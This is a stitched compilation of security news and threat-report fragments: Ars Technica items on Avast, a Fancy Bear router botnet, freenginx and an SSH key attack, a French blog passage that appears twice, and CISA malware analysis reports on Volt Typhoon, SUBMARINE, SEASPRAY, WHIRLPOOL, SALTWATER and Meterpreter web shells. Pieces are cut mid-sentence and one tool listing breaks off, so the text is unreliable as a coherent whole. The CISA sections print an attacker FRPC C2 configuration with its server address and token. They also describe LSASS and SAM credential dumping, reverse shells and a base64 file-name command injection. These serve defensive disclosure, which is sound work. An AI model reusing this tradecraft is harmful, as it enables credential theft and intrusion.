&lt;p&gt;Avast's apps would "block annoying tracking cookies that collect data on your browsing activities," and prevent web services from "tracking your online activity." Deep in its privacy policy, Avast said information that it collected would be "anonymous and aggregate." In its fiercest rhetoric, Avast's desktop software claimed it would stop "hackers making money off your searches."&lt;/p&gt;
&lt;p&gt;All of that language was offered up while Avast was collecting users' browser information from 2014 to 2020, then selling it to more than 100 other companies through &lt;a href="https://arstechnica.com/tech-policy/2020/01/avast-kills-off-jumpshot-the-subsidiary-that-sold-all-your-web-data/"&gt;a since-shuttered entity known as Jumpshot&lt;/a&gt;, according to the Federal Trade Commission.

&lt;p&gt;That malware, which worked as a botnet for the Russian hacking group &lt;a href="https://arstechnica.com/features/2023/05/is-cybersecurity-an-unsolvable-problem/"&gt;Fancy Bear&lt;/a&gt;, was removed in January 2024 under a secret court order as part of "Operation Dying Ember," according to the FBI's director. It affected routers running Ubiquiti's EdgeOS, but only those that had not changed their default administrative password. Access to the routers allowed the hacking group to "conceal and otherwise enable a variety of crimes," the DOJ claims, including spearphishing and credential harvesting in the US and abroad.&lt;/p&gt;
&lt;p&gt;Unlike previous attacks by Fancy Bear—that the DOJ ties to GRU Military Unit 26165, which is also known as APT 28, Sofacy Group, and Sednit, among other monikers—the Ubiquiti intrusion relied on a known malware, &lt;a href="https://arstechnica.com/information-technology/2020/03/lilin-dvrs-and-zyxel-nas-devices-have-been-active-exploit-for-months/"&gt;Moobot&lt;/a&gt;.

His fork, &lt;a href="http://freenginx.org/"&gt;freenginx&lt;/a&gt;, is "going to be run by developers, and not corporate entities," &lt;a href="https://mailman.nginx.org/pipermail/nginx-devel/2024-February/K5IC6VYO2PB7N4HRP2FUQIBIBCGP4WAU.html"&gt;writes Maxim Dounin&lt;/a&gt;, and will be "free from arbitrary corporate actions."&lt;/p&gt;
&lt;p&gt;Dounin is one of the earliest and &lt;a href="http://hg.nginx.org/nginx/"&gt;still most active coders&lt;/a&gt; on the open source Nginx project and one of the first employees of Nginx, Inc., a company created in 2011 to commercially support the steadily growing web server. Nginx is now used on roughly &lt;a href="https://w3techs.com/technologies/overview/web_server"&gt;one-third of the world's &lt;/a&gt;web servers, ahead of Apache.&lt;/p&gt;
&lt;h2&gt;A tricky history of creation and ownership&lt;/h2&gt;
&lt;p&gt;Nginx Inc. was acquired by Seattle-based networking firm F5 in 2019. Later that year, two of Nginx's leaders, Maxim Konovalov and Igor Sysoev, were &lt;a href="https://arstechnica.com/information-technology/2019/12/russian-media-group-rambler-attempting-to-hold-nginx-hostage/"&gt;detained and interrogated in their homes by armed Russian state agents&lt;/a&gt;. Sysoev's former employer, Internet firm &lt;a href="https://en.wikipedia.org/wiki/Rambler_(portal)"&gt;Rambler&lt;/a&gt;, claimed that it owned the rights to Nginx's source code, as it was developed during Sysoev's tenure at Rambler (where Dounin also worked). While the criminal charges and rights do not appear to have materialized, the implications of a Russian company's intrusion into a popular open source piece of the web's infrastructure caused some alarm.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/02/nginx-key-developer-starts-a-freenginx-fork-after-dispute-with-parent-firm/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received three files for analysis obtained from a critical infrastructure compromised by the People’s Republic of China (PRC) state-sponsored cyber group known as Volt Typhoon.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The submitted files enable discovery and command-and-control (C2): (1) An open source Fast Reverse Proxy Client (FRPC) tool used to open a reverse proxy between the compromised system and a Volt Typhoon C2 server; (2) a Fast Reverse Proxy (FRP) that can be used to reveal servers situated behind a network firewall or obscured through Network Address Translation (NAT); and (3) a publicly available port scanner called ScanLine.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;For more information on Volt Typhoon see, joint Cybersecurity Advisory PRC State-Sponsored Actors Compromise, and Maintain Persistent Access to, U.S. Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories, webpage.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a cross platform full featured FRP that is written in GO language (Golang) and packed using Ultimate Packer for Executables (UPX). This utility can be used to locate servers behind a network firewall or obscured through NAT. It includes the KCP (no acronym) network protocol that allows for error-checked and anonymous delivery of data streams using the User Datagram Protocol (UDP) with packet level encryption support.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The program contains two different multiplexer libraries that can bi-directionally stream data over a NAT’d network. It also contains a command line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh). In addition, the utility features a unique capability that detects if the utility is executed from the command line or by double-clicking.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;By default it is configured to connect to an Internet Protocol (IP) address on Transmission Control Protocol (TCP) port 1080. It must receive a specially formed packet from the C2 for the utility to deploy on the system.&lt;/p&gt;

&lt;p&gt;This artifact is a 64-bit Windows executable file that is packed using UPX. This packed file contains a compiled version of an open-source tool published on GitHub called "FRPC". The "FRPC" is a command-line tool written in Golang that is designed to open a reverse proxy between the compromised system and the TA's C2 server.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;When the "FRPC" is installed and executed on the compromised system, it attempts to establish a connection with the Fast Reverse Proxy Server (FRPS) using the reverse proxy method to allow the TA to control the compromised system. This "FRPC" application supports encryption, compression, and allows easy token authentication. It also supports the protocols below:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin protocols--&amp;nbsp;&lt;br /&gt;Transmission Control Protocol (TCP)&amp;nbsp;&lt;br /&gt;User Datagram Protocol (UDP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol (HTTP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol Secure (HTTPS)&amp;nbsp;&lt;br /&gt;--End protocols--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below is the "FRPC" tool configuration that contains the network communication method, the remote "FRPS" server's public Internet Protocol (IP) address and port numbers:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin configuration--&amp;nbsp;&lt;br /&gt;[common]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addr = 192.168.18.111&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_port = 8081&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addrs = [Default IP addresses]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_ports = 8443,8443,8443&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;token = 1kyRdFmuk0i25JbCJmtift1c9VA05VBS&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;protocol = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;tls_enable = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;disable_custom_tls_first_byte = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_level = debug&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;[plugin_socks5]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;type = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;remote_port = 1080&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;plugin = socks5&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_encryption = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_compression = true&amp;nbsp;&lt;br /&gt;--End configuration--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below are the command-line usages and flags of the "FRPC" tool:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin usages and flags--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Usage:&amp;nbsp;&lt;br /&gt;frpc [flags]&amp;nbsp;&lt;br /&gt;frpc [command]&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Available Commands:&amp;nbsp;&lt;br /&gt;help &amp;nbsp;&amp;nbsp;&amp;nbsp;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

Évidemment, je n’ai pas tenu tous les objectifs que j’avais annoncés, mais pour au final faire d’autres choses !&lt;/p&gt;&lt;p&gt;La première, et je me suis arrêté en cours de route avec un article Part 1, est la release de Yeti 2.0 dans son &lt;a href="https://github.com/yeti-platform/yeti/releases/tag/2.0"&gt;intégralité&lt;/a&gt; que nous avons réalisée avec @tomchop.&lt;/p&gt;&lt;p&gt;Ça nous a permis de présenter la nouvelle version à @hacklu cette &lt;a href="https://www.youtube.com/watch?v=k9GeEmGalb8"&gt;année &lt;/a&gt;et d’y faire un atelier pour présenter l’intégration qui peut en être faite avec MISP, Timeskech et d’autres outils opensource de Threat Intelligence ou de DFIR.&lt;/p&gt;&lt;p&gt;Côté enseignement, avec mon collègue Bassem Haidar, nous avons stabilisé les cours de la majeure cybersécurité et nous avons intégré de nouveaux enseignements comme la sécurité du cloud et l’IAM. Nouveauté cette année, j’ai encadré beaucoup d’étudiants dans leurs stages de fin d’études dans différentes entreprises. Ça permet de rester un pied dans la “vraie” vie.&lt;/p&gt;&lt;p&gt;Pour la première fois, nous avons encadré au laboratoire un stage pour le titre ESSI de l’ANSSI, qui a donné lieu à une publication sur la menace dans le monde satellitaire que vous pouvez retrouver &lt;a href="https://www.linkedin.com/posts/sebastien-larinier-b3b21557_rapport-de-stage-activity-7112458376642453505-efQe?utm_source=share&amp;amp;utm_medium=member_desktop"&gt;ici&lt;/a&gt;, réalisé par Arnaud Giraud avec l’aide de Patrice Auffret et &lt;a href="https://onyphe.io"&gt;d’Onyphe&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Nous avons lancé &lt;a href="https://pandora.esiea.fr"&gt;pandora&lt;/a&gt; dans le cadre de services que nous souhaitions fournir aux journalistes et aux activistes.

Nouveauté cette année, j’ai encadré beaucoup d’étudiants dans leurs stages de fin d’études dans différentes entreprises. Ça permet de rester un pied dans la “vraie” vie.&lt;/p&gt;&lt;p&gt;Pour la première fois, nous avons encadré au laboratoire un stage pour le titre ESSI de l’ANSSI, qui a donné lieu à une publication sur la menace dans le monde satellitaire que vous pouvez retrouver &lt;a href="https://www.linkedin.com/posts/sebastien-larinier-b3b21557_rapport-de-stage-activity-7112458376642453505-efQe?utm_source=share&amp;amp;utm_medium=member_desktop"&gt;ici&lt;/a&gt;, réalisé par Arnaud Giraud avec l’aide de Patrice Auffret et &lt;a href="https://onyphe.io"&gt;d’Onyphe&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Nous avons lancé &lt;a href="https://pandora.esiea.fr"&gt;pandora&lt;/a&gt; dans le cadre de services que nous souhaitions fournir aux journalistes et aux activistes.

&lt;p&gt;The post included two images. The first showed a notification pushed to the person’s phone reporting that their UDM Pro, a network controller and network gateway used by tech-enthusiast consumers, had detected someone moving in the backyard. A still shot of video recorded by a connected surveillance camera showed a three-story house surrounded by trees. The second image showed the dashboard belonging to the Reddit user. The user’s connected device was a UDM SE, and the video it captured showed a completely different house.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2023/12/unifi-devices-broadcasted-private-video-to-other-users-accounts/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the piece, Schneier notes that the existing landscape of electronic surveillance has already transformed the modern era, becoming the &lt;a href="https://www.schneier.com/blog/archives/2013/11/surveillance_as_1.html"&gt;business model of the Internet&lt;/a&gt;, where our digital footprints are constantly tracked and analyzed for commercial reasons. Spying, by contrast, can take that kind of economically inspired monitoring to a completely new level:&lt;/p&gt;
&lt;p&gt;"Spying and surveillance are different but related things," Schneier writes. "If I hired a private detective to spy on you, that detective could hide a bug in your home or car, tap your phone, and listen to what you said. At the end, I would get a report of all the conversations you had and the contents of those conversations. If I hired that same private detective to put you under surveillance, I would get a different report: where you went, whom you talked to, what you purchased, what you did."&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2023/12/due-to-ai-we-are-about-to-enter-the-era-of-mass-spying-says-bruce-schneier/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three Cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Start names and paths of .cab files created--&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\em.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\am.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\a.cab&lt;br /&gt;&lt;br /&gt;
			--End names and paths of .cab files created--&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the Remote Procedure Call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "[*]success" in the console.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.&lt;/p&gt;

&lt;p&gt;This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword "hashpasswd" is present. If the keyword "hashpasswd" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;

      &lt;strong&gt;Figure 4. -&lt;/strong&gt; This is the function showing how the script decides between using NTLM or basic authentication based on the keyword "hashpasswd".

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

The researcher, from Palo Alto Networks Prisma Cloud, found that Azure CLI commands could be used to show sensitive data and output to Continuous Integration and Continuous Deployment (CI/CD) logs.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2023/11/microsoft-guidance-regarding-credentials-leaked-to-github-actions-logs-through-azure-cli/</guid></item><item><title>In a first, cryptographic keys protecting SSH connections stolen in new attack</title><link>https://arstechnica.com/security/2023/11/hackers-can-steal-ssh-cryptographic-keys-in-new-cutting-edge-attack/</link><description>An error as small as a single flipped memory bit is all it takes to expose a private key.</description><content:encoded>&lt;p&gt;For the first time, researchers have demonstrated that a large portion of cryptographic keys used to protect data in computer-to-server SSH traffic are vulnerable to complete compromise when naturally occurring computational errors occur while the connection is being established.&lt;/p&gt;
&lt;p&gt;Underscoring the importance of their discovery, the researchers used their findings to calculate the private portion of almost 200 unique SSH keys they observed in public Internet scans taken over the past seven years. The researchers suspect keys used in IPsec connections could suffer the same fate. SSH is the cryptographic protocol used in secure shell connections that allows computers to remotely access servers, usually in security-sensitive enterprise environments. IPsec is a protocol used by virtual private networks that route traffic through an encrypted tunnel.&lt;/p&gt;
&lt;p&gt;The vulnerability occurs when there are errors during the signature generation that takes place when a client and server are establishing a connection. It affects only keys using the RSA cryptographic algorithm, which the researchers found in roughly a third of the SSH signatures they examined. That translates to roughly 1 billion signatures out of the 3.2 billion signatures examined. Of the roughly 1 billion RSA signatures, about one in a million exposed the private key of the host.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2023/11/hackers-can-steal-ssh-cryptographic-keys-in-new-cutting-edge-attack/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

But cue sheets are getting attention again, for all the wrong reasons. They're at the heart of a one-click exploit that could give an attacker code execution on Linux systems with GNOME desktops.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43641"&gt;CVE-2023-43641&lt;/a&gt;, &lt;a href="https://github.blog/2023-10-09-coordinated-disclosure-1-click-rce-on-gnome-cve-2023-43641/#fn-74613-1"&gt;disclosed by GitHub on October 9&lt;/a&gt;, is a memory corruption (or out-of-bounds array writing) issue in the &lt;a href="https://github.com/lipnitsk/libcue"&gt;libcue library&lt;/a&gt;, which parses cue sheets. NIST has yet to provide a score for the issue, but GitHub's submission rates it an 8.8, or "High." While the vulnerability has been patched in the core library, Linux distributions will need to update their desktops to fix it.&lt;/p&gt;
&lt;p&gt;GNOME desktops have, by default, a "tracker miner" that automatically updates whenever certain file locations in a user's home directory are changed. If a user was compelled to download a cue sheet that took advantage of libcue's vulnerability, GNOME's indexing tracker would read the cue sheet, and code in that sheet could be executed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2023/10/one-click-remote-code-exploit-in-cd-cue-files-affects-most-gnome-based-linux-distros/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This file is a SUBMARINE artifact, an empty text/data file. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell. The code in Figure 1 will change the permissions of any directory/file/path with that begins with '/root/mac' to executable. Then, anything containing the string 'mach*' in the directory/file/path '/root/mach' are executed.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;





  
      




      Figure 1 - Figure 1 depicts the Base64 encoded, and decoded, name of the artifact.

&lt;p&gt;This artifact, belonging to the SKIPJACK malware family, is a Perl script that enumerates file system information. This script first checks the file system by opening '/etc/fstab.main/,' then checks the value against the array 'ARGV[0]', which perl automatically provides to hold all values from the command line in. The script will print either 'xfs' or hda depending on the type of file system it finds. The script contains a second if statement that gathers more information about the type of file system. This second if statement contains the regular expression '/^\/dev\/(\S+)\d+\s+\/\s+(\S+)/,' which translates to '/etc/fstab.' The script uses this second half of the code to check for file system type or information about the partition, which it then prints based on the value of '$requested_data.'&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a trojanized Lua module that has been identified as a "SEASPRAY" variant. SEASPRAY registers an event handler for all incoming email attachments. This variant checks for the sender and the string “obt”, which is hard coded in the lua file. If that string is found the malware uses os.execute to execute the file “saslautchd”, see Figure 3.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;





  
      




      &lt;strong&gt;Figure 3&lt;/strong&gt; - This screenshot illustrates how the SEASPRAY filters traffic looking for the string "obt". Once that string is received SEASPRAY uses os.execute to execute the file "saslautchd".

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the WHIRLPOOL malware family, is a 64-bit Linux Executable and Linkable Format (ELF) file. The malware checks processor hardware and architecture, to include if the target system uses AMD or Intel, see Figure 4. Figure 5 shows the malware determining the kernel version by invoking the 'uname' command line function and exploring the contents of the '/proc/sys/kernel/osrelease' file. Figures 6, 7, and 8 show the malware's capacity to connect to a remote address, and then create a new process with the command line argument '/bin/sh.' The connection to a remote host and the invocation of a bash shell are the two components/phases used by reverse shells. Figure 9 shows the malware's capacity to interact with the Name Service Cache Daemon by creating and connecting to a Unix socket at ./var/run/nscd/socket.' This socket can cache Domain Name System (DNS) requests. Rather than listening on port 53, it listens on the socket file itself, for data from other programs/processes. Figure 10 shows the malware's capacity to perform DNS resolution, using the system call 'sys_getpeername.' The malware accesses the target's environment variables.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SALTWATER malware family, is a 32-bit Linux Shared Object (.so) file. The malware can intake data over the network, using a previously established socket, with the 'recv' function as shown in Figure 11. Figure 12 shows the malware creating a new thread, within the calling process. This is thread injection and it can inject two different functions. Figure 13 shows the first function that can perform DNS resolution. Figures 14 and 15 show the second function. The second function can establish communications, over the network, using a TLS version 1 connection. Lastly, using 'popen', the malware can execute any shell command with the same privileges as its calling process.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received 4 files for analysis from an incident response engagement conducted at an Aeronautical Sector organization.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (bitmap.exe, wkHPd.exe) are identified as variants of Metasploit (Meterpreter) and designed to connect and receive unencrypted payloads from their respective command and control (C2) servers. Note: Metasploit is an open source penetration testing software; Meterpreter is a Metasploit attack payload that runs an interactive shell. These executables are used as attack payloads to run interactive shells, allowing a malicious actor the ability to control and execute code on a system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (resource.aspx, ConfigLogin.aspx) are Active Server Pages (ASPX) web shells designed to execute remote JavaScript code on the victim server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			CISA has provided indicators of compromise (IOCs) and YARA rules for detection within this Malware Analysis Report (MAR).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For more information about this compromise, see Joint Cybersecurity Advisory &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a" title="Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475"&gt;Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Executive Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Infamous Chisel is a collection of components targeting Android devices.&lt;/li&gt;
&lt;li&gt;This malware is associated with Sandworm activity.&lt;/li&gt;
